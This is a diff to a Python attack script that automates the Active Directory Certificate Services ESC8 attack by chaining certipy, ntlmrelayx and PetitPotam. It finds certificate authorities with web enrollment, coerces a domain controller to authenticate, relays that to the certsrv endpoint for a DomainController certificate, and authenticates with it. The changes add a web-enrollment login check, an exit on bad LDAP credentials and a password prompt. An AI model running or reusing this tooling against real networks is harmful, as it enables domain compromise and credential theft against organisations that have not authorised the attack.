@@ -7,17 +7,19 @@
 # it a wrapper for certipy and ntlmrelayx to automate esc8
 
 import os
-import subprocess
-import sys
 import re
+import sys
 import json
-import argparse
-import socket
 import fcntl
+import socket
 import struct
 import base64
+import argparse
+import requests
 import threading
+import subprocess
 from termcolor import colored
+from requests.auth import HTTPBasicAuth
 
 def get_ip_address(ifname):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -48,13 +50,19 @@ def certipy_auth(certname,  domain, verbose=False):
         pretty_print(line, verbose)
     process.wait()
 
+
 def certipy_find(username, password, domain, verbose=False):
     command = ["certipy", "find", "-u", username, "-p", password, "-target", domain, "-output", "adcs"]
+    pretty_print("[*] " + " ".join(command))
+
     process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True)
     for line in process.stdout:
+        if "Failed to authenticate to LDAP. Invalid credentials" in line:
+            colored_line = line.replace("[-]", colored("[!]", "red"))
+            pretty_print(colored_line, verbose=True)
+            sys.exit(1)  # exit with an error code
         pretty_print(line, verbose)
     process.wait()
-
 
 def run_ntlmrelayx_and_petitpotam(username, password, domain, verbose=False):
     with open("adcs_Certipy.json", "r") as file:
@@ -68,54 +76,59 @@ def run_ntlmrelayx_and_petitpotam(username, password, domain, verbose=False):
             dns_name = ca.get("DNS Name")
             if web_enrollment == "Enabled" and dns_name:
                 ca_found = True
-                ntlmrelayx_command = (
-                    f"ntlmrelayx.py --target http://{dns_name}/certsrv/certfnsh.asp "
-                    "--adcs --template DomainController"
-                )
-                pretty_print("[*] " + ntlmrelayx_command, verbose)
+                if login_and_get_status(dns_name, username, password) == 200:
+                    ntlmrelayx_command = (
+                        f"ntlmrelayx.py --target http://{dns_name}/certsrv/certfnsh.asp "
+                        "--adcs --template DomainController"
+                    )
+                    pretty_print("[*] " + ntlmrelayx_command, verbose)
 
-                petitpotam_command = (
-                    f"python PetitPotam.py -u {username} -p {password} "
-                    f"{get_ip_address('eth0')} {domain}"
-                )
-                pretty_print("[*] " + petitpotam_command, verbose)
+                    petitpotam_command = (
+                        f"python PetitPotam.py -u {username} -p {password} "
+                        f"{get_ip_address('eth0')} {domain}"
+                    )
+                    pretty_print("[*] " + petitpotam_command, verbose)
 
-                # Run ntlmrelayx
-                with subprocess.Popen(
-                    ntlmrelayx_command, shell=True, stdout=subprocess.PIPE,
-                    stderr=subprocess.STDOUT
-                ) as ntlmrelayx_process:
-
-                    # Run PetitPotam
+                    # Run ntlmrelayx
                     with subprocess.Popen(
-                        petitpotam_command, shell=True, stdout=subprocess.PIPE,
-                        stderr=subprocess.STDOUT, universal_newlines=True
-                    ) as petitpotam_process:
+                        ntlmrelayx_command, shell=True, stdout=subprocess.PIPE,
+                        stderr=subprocess.STDOUT
+                    ) as ntlmrelayx_process:
 
-                        # Print ntlmrelayx output as it's generated if verbose flag is set
-                        for line in iter(ntlmrelayx_process.stdout.readline, b''):
-                            line = line.decode().strip()
-                            pretty_print(line, verbose)
+                        # Run PetitPotam
+                        with subprocess.Popen(
+                            petitpotam_command, shell=True, stdout=subprocess.PIPE,
+                            stderr=subprocess.STDOUT, universal_newlines=True
+                        ) as petitpotam_process:
 
-                            cert = re.search(r"Base64 certificate of user (\w+\$?):", line)
-                            if cert is not None:
-                                certname = cert.group(1)
-                                base64_certificate = next(
-                                    iter(ntlmrelayx_process.stdout.readline, b'')
-                                )
-                                if verbose:
-                                    print("\033[93m" + base64_certificate.decode().strip() + "\033[0m")
+                            # Print ntlmrelayx output as it's generated if verbose flag is set
+                            for line in iter(ntlmrelayx_process.stdout.readline, b''):
+                                line = line.decode().strip()
+                                pretty_print(line, verbose)
 
-                                # Extract base64 certificate from ntlmrelayx output
-                                save_certificate(certname, base64_certificate)
-                                certipy_auth(certname,  domain, verbose)
+                                cert = re.search(r"Base64 certificate of user (\w+\$?):", line)
+                                if cert is not None:
+                                    certname = cert.group(1)
+                                    base64_certificate = next(
+                                        iter(ntlmrelayx_process.stdout.readline, b'')
+                                    )
+                                    if verbose:
+                                        print("\033[93m" + base64_certificate.decode().strip() + "\033[0m")
 
-                                ntlmrelayx_process.terminate()
-                                break  # Stop reading output once we have the certificate
+                                    # Extract base64 certificate from ntlmrelayx output
+                                    save_certificate(certname, base64_certificate)
+                                    certipy_auth(certname,  domain, verbose)
+
+                                    ntlmrelayx_process.terminate()
+                                    break  # Stop reading output once we have the certificate
 
 
-                        if ntlmrelayx_process.poll() is None:
-                            print("Process terminated due to timeout")
+                            if ntlmrelayx_process.poll() is None:
+                                print("Process terminated due to timeout")
+                else:
+                    if verbose:
+                        pretty_print("[!] Unable to verify web enrollment access on " + dns_name, verbose=True)
+
 
     if not ca_found:
         print("\033[91m[!] There are no Certificate Authorities with web enrollment enabled :( womp womp \033[0m", end='')  # Print in red
@@ -148,14 +161,25 @@ def main():
         print("Invalid domain/user:pass format")
         sys.exit(1)
 
-    domain = domain_user_pass[0]
-    user_pass = domain_user_pass[1].split(":")
-    if len(user_pass) != 2:
+    from getpass import getpass
+
+    domain_user_pass = args.domain_user_pass.split("/")
+    if len(domain_user_pass) != 2:
         print("Invalid domain/user:pass format")
         sys.exit(1)
 
-    username = user_pass[0]
-    password = user_pass[1]
+    domain = domain_user_pass[0]
+    user_pass = domain_user_pass[1].split(":")
+    if len(user_pass) != 2:
+        username = user_pass[0]
+        print("Password not provided, please enter password: ")
+        password = getpass()
+        if not password:  # user didn't enter password
+            print("Invalid domain/user:pass format")
+            sys.exit(1)
+    else:
+        username = user_pass[0]
+        password = user_pass[1]
 
     certipy_find(username, password, domain, args.verbose)
     run_ntlmrelayx_and_petitpotam(username, password, domain, args.verbose)
